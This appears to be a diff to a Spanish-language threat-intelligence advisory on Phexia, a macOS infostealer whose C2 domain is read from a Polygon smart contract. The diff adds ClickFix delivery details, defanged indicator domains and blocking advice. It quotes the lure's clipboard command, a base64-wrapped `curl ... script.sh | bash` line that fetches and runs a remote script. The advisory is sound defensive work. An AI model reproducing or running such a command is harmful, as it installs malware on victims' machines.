@@ -1,11 +1,19 @@
 # Phexia: el stealer de macOS que lee su C2 desde un contrato en Polygon
 
-**Familia:** Phexia, infostealer para macOS en AppleScript · **Entrega:** ClickFix, según fuentes públicas · **Resolución del C2:** contrato inteligente en Polygon (MITRE ATT&CK T1102.001) · **TLP:CLEAR**
+**Familia:** Phexia, infostealer para macOS en AppleScript · **Entrega:** ClickFix en páginas de Cloudflare Pages (escaneos de ScanMalware, 01-10-2026) · **Resolución del C2:** contrato inteligente en Polygon (MITRE ATT&CK T1102.001) · **TLP:CLEAR**
 **Fuente primaria:** fab0 ([@FABO97662188](https://x.com/FABO97662188)) en X, 27-09-2026 · **Contrastado y ampliado por Intellroom:** 28-09-2026
 
 Phexia no trae escrito el dominio de su servidor de control. El AppleScript le pregunta a un **contrato inteligente en Polygon**, a través de cuatro nodos RPC públicos, cuál es el dominio del momento. Para mover el C2, el operador escribe un valor nuevo con una sola transacción, así que tumbar un dominio no basta: el operador escribe otro y el malware lo lee en su próxima consulta.
 
 fab0 publicó la lista de dominios recientes y una captura del código. Intellroom leyó el contrato directamente en la blockchain, **sin enviar una sola petición a los C2**, y reconstruyó su historia completa. Lo que le da resiliencia al operador también lo expone: cada cambio queda público, firmado y con fecha.
+
+## Actualización 08-10-2026 (2): cómo llega a la víctima
+
+Un hunt público de ScanMalware.com, creado el 01-10, detecta páginas falsas de verificación con el título *«Secure Gateway • Quick Verification»*, alojadas en Cloudflare Pages. Intellroom leyó en la API pública de ScanMalware lo que esas páginas copiaron al portapapeles en **6 escaneos del 01-10**: siempre `bash <<< $(echo "<base64>" | base64 -d)`, que decodificado es `curl -s 'hxxps://<servidor>/script.sh' | bash`. La víctima cree que pasa un «no soy un robot», lo pega en la Terminal y descarga el cargador. **No se visitó ninguna página ni servidor.**
+
+- **2 páginas señuelo:** `securecheckv1-proceed[.]pages[.]dev` y `quicksecurity-checkpointv1[.]pages[.]dev`. Se bloquea el subdominio, **nunca `pages.dev` entero**.
+- **2 servidores de `script.sh`:** `virelianmatrix[.]digital` (resuelve, detrás de Cloudflare) y `aetherframework[.]digital` (suspendido por el registrador). **Se registraron el mismo segundo**, el 06-06-2026 a las 10:13:32 UTC.
+- **El vínculo con este contrato es indirecto.** ScanMalware afirma que el script instala Phexia, pero su hunt cita a fab0 y a Have I Been Squatted y solo coincide por el título de la página. Have I Been Squatted documentó en julio **otra cadena con el mismo patrón** de entrega, cuyo script consultaba **este contrato** con el mismo selector; según ellos, el 04-07 devolvía `apdhlhs3[.]xyz`, justo el valor que el historial de la blockchain tiene vigente ese día. Eso prueba la cadena de julio, no los hosts de octubre. **No hay copia de los `script.sh`:** confianza baja a moderada. Bloquear los 4 hosts se justifica igual: las páginas mandan a bajar un script remoto y ejecutarlo con bash.
 
 ## Actualización 08-10-2026: siete C2 nuevos y rotación más rápida
 
@@ -32,6 +40,8 @@ El 07-10 fab0 publicó los últimos ocho valores del contrato ([post](https://x.
 |---|---|---|
 | Dominio (C2 vigente) | `sayosay[.]cc` (desde el 05-10) | Bloquear |
 | Dominios (28 anteriores) | Ver `iocs.txt` | Bloquear; los caídos sirven para buscar en logs desde el 18-05 |
+| Páginas señuelo | `securecheckv1-proceed[.]pages[.]dev` · `quicksecurity-checkpointv1[.]pages[.]dev` | Bloquear el subdominio, **nunca `pages.dev`** |
+| Servidores de `script.sh` | `virelianmatrix[.]digital` (resuelve) · `aetherframework[.]digital` (suspendido) | Bloquear |
 | Dominio | `johncon[.]my` | **Vigilar, no bloquear a ciegas:** puede ser de un tercero |
 | Contrato y wallet | `0xA3a603F8…7C15C2A0` · `0x363AeAF1…C64AbE3` | Detectar y vigilar en la blockchain |
 | Nodos RPC públicos de Polygon | `polygon.drpc.org` y otros tres | **No bloquear:** son legítimos. Detectar quién los consulta |
@@ -43,9 +53,10 @@ El 07-10 fab0 publicó los últimos ocho valores del contrato ([post](https://x.
 |---|---|
 | ![Cadena del ataque](01_flujo_ataque.png) | ![Modelo del Diamante](02_modelo_diamante.png) |
 | ![Post de fab0 en X](03_evidencia_x_post_fab0.png) | ![Código publicado por fab0](04_evidencia_x_codigo_fab0.png) |
-| ![Post de fab0 del 07-10](05_evidencia_x_post_fab0_07102026.png) | |
+| ![Post de fab0 del 07-10](05_evidencia_x_post_fab0_07102026.png) | ![Hunt de ScanMalware](06_evidencia_scanmalware_hunt_08102026.png) |
+| ![Have I Been Squatted: el mismo contrato en julio](07_evidencia_hibs_contrato_08102026.png) | |
 
-*Capturas 03 y 04: post original de fab0 ([@FABO97662188](https://x.com/FABO97662188)) en X, 27-09-2026; captura 05: su post del 07-10-2026. Reproducidos como fuente con su crédito.*
+*Capturas 03 y 04: post original de fab0 ([@FABO97662188](https://x.com/FABO97662188)) en X, 27-09-2026; captura 05: su post del 07-10-2026. Captura 06: hunt de ScanMalware.com (Triop AB), 01-10-2026. Captura 07: Ben Folland, Have I Been Squatted, 06-07-2026. Reproducidos como fuente con su crédito.*
 
 ## Documentos
 
@@ -57,6 +68,7 @@ El 07-10 fab0 publicó los últimos ocho valores del contrato ([post](https://x.
 - **[`evidencia_wallet_operador_28092026.txt`](evidencia_wallet_operador_28092026.txt)**: las 35 transacciones de la wallet del operador.
 - **[`evidencia_dns_rdap_28092026.txt`](evidencia_dns_rdap_28092026.txt)**: DNS de los 22 dominios y RDAP de los seis más recientes, con hora.
 - **[`evidencia_historial_contrato_08102026.txt`](evidencia_historial_contrato_08102026.txt)** y **[`evidencia_dns_rdap_08102026.txt`](evidencia_dns_rdap_08102026.txt)**: las 7 escrituras nuevas leídas por JSON-RPC (respuestas crudas) y DNS y RDAP de los 8 dominios recientes, con hora.
+- **[`evidencia_entrega_clickfix_08102026.txt`](evidencia_entrega_clickfix_08102026.txt)**: lo que copiaron las páginas señuelo en los 6 escaneos (respuestas crudas de la API de ScanMalware), DNS y RDAP de los 4 hosts y el cruce del blog de Have I Been Squatted con el historial del contrato, con hora.
 - Sumas de verificación en **[`evidencia.sha256`](evidencia.sha256)**.
 
 ## Lo que no se pudo verificar ni se publica
@@ -65,6 +77,8 @@ El 07-10 fab0 publicó los últimos ocho valores del contrato ([post](https://x.
 - **La ruta del C2 después de `check`:** la captura la corta.
 - **Que cada dominio histórico haya respondido como C2.** Se afirma que fue el valor del contrato.
 - **No hay datos de que la campaña apunte a Chile** ni a un sector en particular.
+- **El contenido de los `script.sh`:** no hay copia. Que instalen Phexia lo dice ScanMalware, que cita a fab0 y a Have I Been Squatted y coincide solo por el título; Have I Been Squatted vio en julio otra cadena con el mismo patrón que consultaba este contrato.
+- **La etiqueta ClearFake** de los dos servidores (según ScanMalware): no se pudo comprobar.
 
 ---
-*Intellroom Threat Intelligence: fab0 como fuente primaria; estado del contrato leído con `eth_getCode` y `eth_call` en nodos públicos de Polygon; código fuente verificado e historial de transacciones en la API de Blockscout; RDAP y DNS de cada dominio; cystack y Cookie Engineer para el contexto de la familia.*
+*Intellroom Threat Intelligence: fab0 como fuente primaria; estado del contrato leído con `eth_getCode` y `eth_call` en nodos públicos de Polygon; código fuente verificado e historial de transacciones en la API de Blockscout; RDAP y DNS de cada dominio; cystack y Cookie Engineer para el contexto de la familia; ScanMalware y Have I Been Squatted para la entrega.*
